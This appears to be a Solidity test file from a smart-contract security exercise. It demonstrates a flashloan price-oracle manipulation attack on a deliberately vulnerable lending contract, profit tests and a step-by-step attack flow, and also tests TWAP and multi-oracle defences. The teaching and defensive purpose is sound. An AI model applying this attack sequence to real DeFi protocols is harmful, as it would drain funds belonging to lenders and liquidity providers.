// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/solution/Project34Solution.sol";

/**
 * @title Project34Test
 * @notice Comprehensive tests for oracle manipulation attack
 */
contract Project34Test is Test {
    // Contracts
    Token public token0; // Collateral token (e.g., WBTC)
    Token public token1; // Borrow token (e.g., USDC)
    SimpleAMM public amm;
    VulnerableLending public vulnerableLending;
    FlashloanProvider public flashloanProvider;
    AttackerSolution public attacker;

    // Secure implementations
    TWAPOracle public twapOracle;
    SecureLending public secureLending;
    MultiOracleProtection public multiOracle;

    // Test accounts
    address public liquidityProvider = address(0x1);
    address public normalUser = address(0x2);
    address public attackerAddress = address(0x3);

    // Initial balances
    uint256 constant INITIAL_TOKEN_SUPPLY = 1_000_000 * 1e18;
    uint256 constant AMM_LIQUIDITY_0 = 100 * 1e18; // 100 token0
    uint256 constant AMM_LIQUIDITY_1 = 200_000 * 1e18; // 200,000 token1
    // Initial price: 1 token0 = 2000 token1

    function setUp() public {
        // Deploy tokens
        token0 = new Token("Wrapped BTC", "WBTC", INITIAL_TOKEN_SUPPLY);
        token1 = new Token("USD Coin", "USDC", INITIAL_TOKEN_SUPPLY);

        // Deploy AMM
        amm = new SimpleAMM(address(token0), address(token1));

        // Deploy vulnerable lending protocol
        vulnerableLending = new VulnerableLending(
            address(amm),
            address(token0),
            address(token1)
        );

        // Deploy flashloan provider
        flashloanProvider = new FlashloanProvider(address(token1));

        // Setup liquidity provider
        vm.startPrank(liquidityProvider);
        token0.mint(liquidityProvider, AMM_LIQUIDITY_0);
        token1.mint(liquidityProvider, AMM_LIQUIDITY_1);

        // Add liquidity to AMM
        token0.approve(address(amm), AMM_LIQUIDITY_0);
        token1.approve(address(amm), AMM_LIQUIDITY_1);
        amm.addLiquidity(AMM_LIQUIDITY_0, AMM_LIQUIDITY_1);

        // Fund flashloan provider
        token1.mint(liquidityProvider, 500_000 * 1e18);
        token1.approve(address(flashloanProvider), 500_000 * 1e18);
        flashloanProvider.deposit(500_000 * 1e18);

        // Fund lending protocol
        token1.mint(address(vulnerableLending), 100_000 * 1e18);
        vm.stopPrank();

        // Setup normal user
        vm.startPrank(normalUser);
        token0.mint(normalUser, 10 * 1e18);
        token1.mint(normalUser, 20_000 * 1e18);
        vm.stopPrank();

        // Setup attacker
        vm.startPrank(attackerAddress);
        token0.mint(attackerAddress, 1 * 1e18); // Small amount for collateral
        vm.stopPrank();

        // Deploy attacker contract
        attacker = new AttackerSolution(
            address(amm),
            address(vulnerableLending),
            address(token0),
            address(token1),
            address(flashloanProvider)
        );

        // Give attacker contract some token0 for collateral
        vm.prank(attackerAddress);
        token0.transfer(address(attacker), 1 * 1e18);
    }

    /**
     * @notice Test basic AMM functionality
     */
    function test_AMMBasics() public {
        uint256 price = amm.getPrice();

        // Initial price should be 200,000 / 100 = 2000 token1 per token0
        assertEq(price, 2000 * 1e18, "Initial price incorrect");

        // Check reserves
        assertEq(amm.reserve0(), AMM_LIQUIDITY_0, "Reserve0 incorrect");
        assertEq(amm.reserve1(), AMM_LIQUIDITY_1, "Reserve1 incorrect");
    }

    /**
     * @notice Test that swapping affects the price
     */
    function test_SwapAffectsPrice() public {
        uint256 priceBefore = amm.getPrice();

        // Swap token1 for token0 (buy token0)
        vm.startPrank(normalUser);
        uint256 swapAmount = 10_000 * 1e18; // 10,000 token1
        token1.approve(address(amm), swapAmount);
        amm.swap(address(token1), swapAmount);
        vm.stopPrank();

        uint256 priceAfter = amm.getPrice();

        // Price should increase (token0 becomes more expensive)
        assertGt(priceAfter, priceBefore, "Price should increase after swap");

        console.log("Price before swap:", priceBefore / 1e18);
        console.log("Price after swap:", priceAfter / 1e18);
    }

    /**
     * @notice Test normal lending behavior
     */
    function test_NormalLending() public {
        vm.startPrank(normalUser);

        // Deposit collateral
        uint256 depositAmount = 1 * 1e18; // 1 token0
        token0.approve(address(vulnerableLending), depositAmount);
        vulnerableLending.deposit(depositAmount);

        // Check deposit
        assertEq(vulnerableLending.deposits(normalUser), depositAmount);

        // Borrow based on collateral
        // Price = 2000, collateral value = 2000 token1
        // Max borrow = 2000 * 100 / 150 = 1333 token1
        uint256 borrowAmount = 1333 * 1e18;
        vulnerableLending.borrow(borrowAmount);

        // Check borrowed amount
        assertEq(vulnerableLending.borrowed(normalUser), borrowAmount);

        vm.stopPrank();
    }

    /**
     * @notice TEST THE ORACLE MANIPULATION ATTACK
     * @dev This is the main attack demonstration
     */
    function test_OracleManipulationAttack() public {
        console.log("\n=== ORACLE MANIPULATION ATTACK ===\n");

        // Record initial state
        uint256 initialPrice = amm.getPrice();
        console.log("Initial price:", initialPrice / 1e18, "token1 per token0");

        uint256 lendingBalanceBefore = token1.balanceOf(address(vulnerableLending));
        console.log("Lending protocol balance:", lendingBalanceBefore / 1e18);

        // Execute attack
        vm.startPrank(attackerAddress);

        uint256 flashloanAmount = 100_000 * 1e18; // 100k token1
        uint256 collateralAmount = 0.5 * 1e18;    // 0.5 token0

        console.log("\nAttack parameters:");
        console.log("- Flashloan amount:", flashloanAmount / 1e18, "token1");
        console.log("- Collateral amount:", collateralAmount / 1e18, "token0");

        // Execute attack
        attacker.attack(flashloanAmount, collateralAmount);

        vm.stopPrank();

        // Check results
        uint256 finalPrice = amm.getPrice();
        console.log("\nFinal price:", finalPrice / 1e18, "token1 per token0");

        uint256 profit = attacker.getProfit();
        console.log("\nAttacker profit:", profit / 1e18, "token1");

        uint256 lendingBalanceAfter = token1.balanceOf(address(vulnerableLending));
        console.log("Lending protocol balance after:", lendingBalanceAfter / 1e18);
        console.log("Protocol loss:", (lendingBalanceBefore - lendingBalanceAfter) / 1e18);

        // Attack should be profitable
        assertGt(profit, 0, "Attack should be profitable");

        // Price should be restored (approximately)
        // Allow 5% deviation due to swap fees
        uint256 priceDiff = finalPrice > initialPrice
            ? finalPrice - initialPrice
            : initialPrice - finalPrice;
        uint256 priceDeviation = (priceDiff * 100) / initialPrice;
        assertLt(priceDeviation, 10, "Price should be mostly restored");
    }

    /**
     * @notice Test detailed attack flow with step-by-step verification
     */
    function test_DetailedAttackFlow() public {
        console.log("\n=== DETAILED ATTACK FLOW ===\n");

        uint256 flashloanAmount = 100_000 * 1e18;
        uint256 collateralAmount = 0.5 * 1e18;

        // Step 1: Initial state
        uint256 step1Price = amm.getPrice();
        console.log("Step 1 - Initial price:", step1Price / 1e18);

        // Step 2: Simulate flashloan
        vm.startPrank(address(attacker));
        token1.mint(address(attacker), flashloanAmount);

        // Step 3: Manipulate price
        token1.approve(address(amm), flashloanAmount);
        uint256 token0Received = amm.swap(address(token1), flashloanAmount);

        uint256 step3Price = amm.getPrice();
        console.log("Step 3 - Price after manipulation:", step3Price / 1e18);
        console.log("Token0 received from swap:", token0Received / 1e18);

        uint256 priceIncrease = ((step3Price - step1Price) * 100) / step1Price;
        console.log("Price increase: ", priceIncrease, "%");

        // Step 4: Deposit collateral at inflated price
        token0.approve(address(vulnerableLending), collateralAmount);
        vulnerableLending.deposit(collateralAmount);

        // Step 5: Borrow maximum
        uint256 collateralValue = (collateralAmount * step3Price) / 1e18;
        uint256 maxBorrow = (collateralValue * 100) / 150;
        console.log("Max borrow at inflated price:", maxBorrow / 1e18);

        vulnerableLending.borrow(maxBorrow);
        console.log("Successfully borrowed:", maxBorrow / 1e18);

        // Step 6: Restore price
        uint256 token0ToSwap = token0Received - collateralAmount;
        token0.approve(address(amm), token0ToSwap);
        amm.swap(address(token0), token0ToSwap);

        uint256 step6Price = amm.getPrice();
        console.log("Step 6 - Price after restoration:", step6Price / 1e18);

        vm.stopPrank();

        // Verify attack was successful
        assertGt(maxBorrow, collateralAmount * step1Price / 1e18, "Should borrow more than fair value");
    }

    /**
     * @notice Test that TWAP oracle prevents single-transaction manipulation
     */
    function test_TWAPProtection() public {
        console.log("\n=== TWAP ORACLE PROTECTION ===\n");

        // Deploy TWAP oracle
        twapOracle = new TWAPOracle(address(amm));

        // Deploy secure lending with TWAP
        secureLending = new SecureLending(
            address(twapOracle),
            address(token0),
            address(token1)
        );

        // Fund secure lending
        vm.prank(liquidityProvider);
        token1.mint(address(secureLending), 100_000 * 1e18);

        // Wait for TWAP period to initialize
        vm.warp(block.timestamp + 1 hours);

        // Update TWAP
        twapOracle.update();

        uint256 twapPrice = twapOracle.getPrice();
        console.log("TWAP price:", twapPrice / 1e18);

        // Try to attack with manipulation
        vm.startPrank(normalUser);

        // Manipulate spot price
        uint256 swapAmount = 50_000 * 1e18;
        token1.approve(address(amm), swapAmount);
        amm.swap(address(token1), swapAmount);

        uint256 spotPrice = amm.getPrice();
        console.log("Spot price after manipulation:", spotPrice / 1e18);

        // TWAP should not reflect manipulation immediately
        uint256 twapAfterManipulation = twapOracle.getPrice();
        console.log("TWAP after manipulation (before update):", twapAfterManipulation / 1e18);

        assertEq(twapAfterManipulation, twapPrice, "TWAP should not change before update");

        vm.stopPrank();

        console.log("\nTWAP successfully prevented single-transaction manipulation");
    }

    /**
     * @notice Test secure lending prevents same-block borrow
     */
    function test_SecureLendingBlockProtection() public {
        // Deploy secure contracts
        twapOracle = new TWAPOracle(address(amm));

        vm.warp(block.timestamp + 1 hours);
        twapOracle.update();

        secureLending = new SecureLending(
            address(twapOracle),
            address(token0),
            address(token1)
        );

        vm.prank(liquidityProvider);
        token1.mint(address(secureLending), 100_000 * 1e18);

        // Try to deposit and borrow in same block
        vm.startPrank(normalUser);

        uint256 depositAmount = 1 * 1e18;
        token0.approve(address(secureLending), depositAmount);
        secureLending.deposit(depositAmount);

        // Try to borrow immediately (same block)
        vm.expectRevert("Wait for next block");
        secureLending.borrow(1000 * 1e18);

        vm.stopPrank();

        console.log("Same-block borrow prevented successfully");
    }

    /**
     * @notice Test multi-oracle protection
     */
    function test_MultiOracleProtection() public {
        console.log("\n=== MULTI-ORACLE PROTECTION ===\n");

        // Deploy TWAP oracle
        twapOracle = new TWAPOracle(address(amm));

        vm.warp(block.timestamp + 1 hours);
        twapOracle.update();

        // Deploy multi-oracle protection
        multiOracle = new MultiOracleProtection(address(twapOracle), address(amm));

        // Normal case: prices should agree
        uint256 price = multiOracle.getPrice();
        console.log("Multi-oracle price (normal):", price / 1e18);

        // Manipulate spot price significantly
        vm.startPrank(normalUser);
        uint256 swapAmount = 80_000 * 1e18; // Large swap
        token1.approve(address(amm), swapAmount);
        amm.swap(address(token1), swapAmount);
        vm.stopPrank();

        uint256 spotPrice = amm.getPrice();
        uint256 twapPrice = twapOracle.getPrice();

        console.log("Spot price after large swap:", spotPrice / 1e18);
        console.log("TWAP price:", twapPrice / 1e18);

        // Multi-oracle should reject due to deviation
        vm.expectRevert("Oracle price deviation too large");
        multiOracle.getPrice();

        console.log("Multi-oracle successfully detected price manipulation");
    }

    /**
     * @notice Test profit calculation from attack
     */
    function test_AttackProfitability() public {
        console.log("\n=== ATTACK PROFITABILITY ANALYSIS ===\n");

        // Test with different flashloan amounts
        uint256[] memory flashloanAmounts = new uint256[](3);
        flashloanAmounts[0] = 50_000 * 1e18;
        flashloanAmounts[1] = 100_000 * 1e18;
        flashloanAmounts[2] = 150_000 * 1e18;

        for (uint256 i = 0; i < flashloanAmounts.length; i++) {
            // Reset state
            setUp();

            // Give attacker contract collateral
            vm.prank(attackerAddress);
            token0.transfer(address(attacker), 0.5 * 1e18);

            // Execute attack
            vm.prank(attackerAddress);
            attacker.attack(flashloanAmounts[i], 0.5 * 1e18);

            uint256 profit = attacker.getProfit();

            console.log("\nFlashloan amount:", flashloanAmounts[i] / 1e18);
            console.log("Profit:", profit / 1e18);
            console.log("ROI: N/A (no capital required, only gas)");
        }
    }

    /**
     * @notice Test liquidation scenario
     */
    function test_ManipulatedPriceLiquidation() public {
        // Normal user deposits and borrows
        vm.startPrank(normalUser);

        token0.approve(address(vulnerableLending), 1 * 1e18);
        vulnerableLending.deposit(1 * 1e18);

        uint256 borrowAmount = 1000 * 1e18;
        vulnerableLending.borrow(borrowAmount);

        uint256 healthBefore = vulnerableLending.getHealthFactor(normalUser);
        console.log("\nHealth factor before manipulation:", healthBefore);

        vm.stopPrank();

        // Attacker manipulates price downward (makes collateral less valuable)
        vm.startPrank(attackerAddress);

        // Swap token0 for token1 (sell collateral token)
        token0.mint(attackerAddress, 10 * 1e18);
        token0.approve(address(amm), 10 * 1e18);
        amm.swap(address(token0), 10 * 1e18);

        uint256 healthAfter = vulnerableLending.getHealthFactor(normalUser);
        console.log("Health factor after manipulation:", healthAfter);

        vm.stopPrank();

        // Health factor should decrease
        assertLt(healthAfter, healthBefore, "Health factor should decrease");
    }

    /**
     * @notice Test edge case: insufficient liquidity
     */
    function test_InsufficientLiquidityForAttack() public {
        // Create new AMM with very low liquidity
        SimpleAMM lowLiquidityAMM = new SimpleAMM(address(token0), address(token1));

        vm.startPrank(liquidityProvider);
        token0.mint(liquidityProvider, 1 * 1e18);
        token1.mint(liquidityProvider, 2000 * 1e18);

        token0.approve(address(lowLiquidityAMM), 1 * 1e18);
        token1.approve(address(lowLiquidityAMM), 2000 * 1e18);
        lowLiquidityAMM.addLiquidity(1 * 1e18, 2000 * 1e18);
        vm.stopPrank();

        // Try to swap more than available
        vm.startPrank(normalUser);
        uint256 hugeSwap = 50_000 * 1e18;
        token1.approve(address(lowLiquidityAMM), hugeSwap);

        // Should get very little token0 back due to slippage
        uint256 received = lowLiquidityAMM.swap(address(token1), hugeSwap);

        console.log("\nAttempted to swap:", hugeSwap / 1e18, "token1");
        console.log("Received only:", received / 1e18, "token0");
        console.log("This demonstrates why liquidity matters for attacks");

        vm.stopPrank();
    }

    /**
     * @notice Fuzz test: attack with random parameters
     */
    function testFuzz_OracleManipulation(uint96 flashloanAmount, uint96 collateralAmount) public {
        // Bound inputs to reasonable ranges
        flashloanAmount = uint96(bound(flashloanAmount, 1000 * 1e18, 200_000 * 1e18));
        collateralAmount = uint96(bound(collateralAmount, 0.1 * 1e18, 2 * 1e18));

        // Setup attacker with collateral
        vm.prank(attackerAddress);
        token0.mint(attackerAddress, collateralAmount);

        vm.prank(attackerAddress);
        token0.transfer(address(attacker), collateralAmount);

        // Execute attack
        vm.prank(attackerAddress);
        try attacker.attack(flashloanAmount, collateralAmount) {
            // Attack succeeded - verify profit
            uint256 profit = attacker.getProfit();
            // Profit might be 0 due to fees, but shouldn't revert
            assertGe(profit, 0, "Profit should be non-negative");
        } catch {
            // Attack failed - this is okay, some parameters might not work
            // Common reasons: insufficient liquidity, not enough collateral, etc.
        }
    }
}
